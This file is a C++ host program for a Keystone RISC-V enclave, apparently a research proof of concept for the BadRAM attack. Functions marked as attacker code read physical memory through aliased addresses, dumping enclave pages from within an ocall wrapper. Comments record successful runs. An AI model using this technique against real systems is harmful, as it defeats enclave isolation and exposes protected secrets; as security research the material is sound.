//******************************************************************************
// Copyright (c) 2018, The Regents of the University of California (Regents).
// All Rights Reserved. See LICENSE for license details.
//------------------------------------------------------------------------------
#include <cstdint>
#include <cstdio>
#include <edge_call.h>
#include <keystone.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>

extern "C" {
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/include/readalias.h"
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/readalias.c"
// #include
// "/home/alouka/Documents/repos/badram-riscv/common-code/include/parse_pagemap.h"
// #include
// "/home/alouka/Documents/repos/badram-riscv/common-code/parse_pagemap.c"
}
unsigned long print_string(char *str);
void print_string_wrapper(void *buffer);
#define OCALL_PRINT_STRING 1

char __attribute__((aligned(0x1000))) test_buff[0x1000];
/***
 * An example call that will be exposed to the enclave application as
 * an "ocall". This is performed by an edge_wrapper function (below,
 * print_string_wrapper) and by registering that wrapper with the
 * enclave object (below, main).
 ***/
unsigned long print_string(char *str) {
  return printf("Enclave said: \"%s\"\n", str);
}

int main(int argc, char **argv) {

  open_kmod();

  Keystone::Enclave enclave;
  Keystone::Params params;

  params.setFreeMemSize(1024 * 1024);
  params.setUntrustedSize(1024 * 1024);

  enclave.init(argv[1], argv[2], argv[3], params);

  enclave.registerOcallDispatch(incoming_call_dispatch);

  /* We must specifically register functions we want to export to the
     enclave. */
  register_call(OCALL_PRINT_STRING, print_string_wrapper);

  edge_call_init_internals((uintptr_t)enclave.getSharedBuffer(),
                           enclave.getSharedBufferSize());

  enclave.run();
  return 0;
}

void reading_secret() {
  printf("Reading secret with badram\n");
  // set bufffer to A
  memset(test_buff, 'A', 0x1000);
  char buf[4096] = {0};
  page_stats_t stats;

  /*j<64 gb ->  (2^4)^9
   * 0x200000000
   */
  for (uint64_t j = 0x200000000; j < 0x1000000000; j += 0x1000) {

    /*copy content of the page to buf using physical address*/
    if (memcpy_frompa(buf, j, 4096, &stats, true) != 0) {
      // printf("PAddr reading Error\n");
      // return ;
      memset(buf, '0', 0x1000);
      continue;
    }

    /* compare page with test buffer*/
    if (memcmp(buf, test_buff, 0x1000) == 0) {
      printf("  Test-success at buffer: [%p]\n", j);
    }
  }
}

void print_page(char buf[0x1000], uint64_t addr) {
  printf("Page at [%llx]: \n", addr);
  for (int val = 0; val < 0x1000; val++)
    printf("%c ", buf[val]);
  printf("\n");
}

void dump_enclave_mem() {
  printf("Badram memory dump...\n");
  memset(test_buff, 'A', 0x1000);
  char buf[0x1000] = {0};
  page_stats_t stats;
  uint64_t alias_mask = 0x800000000;
  // start address and end address is after 512 pages
  uint64_t enclave_start = 0x108c00000 ^ alias_mask;
  uint64_t enclave_end = (enclave_start + (512 * 0x1000));

  uint32_t deadbeef = 0xdeadbeef;
  memcpy(test_buff, &deadbeef, sizeof(deadbeef));

  // if size is 0x200000 >> 12 = 0x200 = 512 pages
  // 2097152 = 512 * 4096
  // 0x200000000
  // 0x80000 0000
  // for (uint64_t Paddr = 0x200000000; Paddr < 0x1000000000; Paddr += 0x1000) {
  for (uint64_t Paddr = enclave_start; Paddr < enclave_end; Paddr += 0x1000) {

    /*copy content of the page to buf using physical address*/
    if (memcpy_frompa(buf, Paddr, 0x1000, &stats, true) != 0) {
      printf("PAddr reading Error\n");
      return;
      // continue;
    }

    print_page(buf, Paddr);
    /* compare page with test buffer*/
    // if (memcmp(buf, test_buff, 0x1000) == 0) {
    //   print_page(buf, Paddr);
    // }
  }
}
/***
 * Example edge-wrapper function. These are currently hand-written
 * wrappers, but will have autogeneration tools in the future.
 ***/
void print_string_wrapper(void *buffer) {
  /* Parse and validate the incoming call data */
  struct edge_call *edge_call = (struct edge_call *)buffer;
  uintptr_t call_args;
  unsigned long ret_val;
  size_t arg_len;
  if (edge_call_args_ptr(edge_call, &call_args, &arg_len) != 0) {
    edge_call->return_data.call_status = CALL_STATUS_BAD_OFFSET;
    return;
  }

  /* Pass the arguments from the eapp to the exported ocall function */
  //  ret_val = print_string((char *)call_args);

  /* Setup return data from the ocall function */
  uintptr_t data_section = edge_call_data_ptr();
  memcpy((void *)data_section, &ret_val, sizeof(unsigned long));
  if (edge_call_setup_ret(edge_call, (void *)data_section,
                          sizeof(unsigned long))) {
    edge_call->return_data.call_status = CALL_STATUS_BAD_PTR;
  } else {
    edge_call->return_data.call_status = CALL_STATUS_OK;
  }

  /*Bad ram attacker code*/
  printf("Buffer pointer: %p\n", buffer); // virt address

  // reading_secret();
  dump_enclave_mem();
  /* This will now eventually return control to the enclave */
  return;
}
// debian@debian-pioneer:~/keystone-examples$ sudo ./hello-secret.ke && sudo
// ./hello-secret.ke
// Verifying archive integrity... MD5 checksums are OK. All
// good. Uncompressing Keystone Enclave Package Buffer pointer: 0x3fb5f8a000
// Reading secret with badram
//   Test-success at buffer: [0x907042000]
//   Test-success at buffer: [0x907043000]
//
// Verifying archive integrity... MD5 checksums are OK. All good.
// Uncompressing Keystone Enclave Package
// Buffer pointer: 0x3fa819a000
// Reading secret with badram
//   Test-success at buffer: [0x907042000]
//   Test-success at buffer: [0x907043000]
//
// debian@debian-pioneer:~/keystone-examples$ sudo dmesg |tail -10
//[157163.454881] Opened module.
//[157163.461233] Enclave Paddr: [0x0000000107000000] -- Vaddr
//[ffffffd907000000] -- size: [2097152] -- is-cma: [false]
//[157815.118818] Closed module.
//[157815.351843] Opened module.
//
//[157815.358252] Enclave Paddr: [0x0000000107000000] -- Vaddr
//[ffffffd907000000] -- size: [2097152] -- is-cma: [false]
//[158467.101153] Closed module.
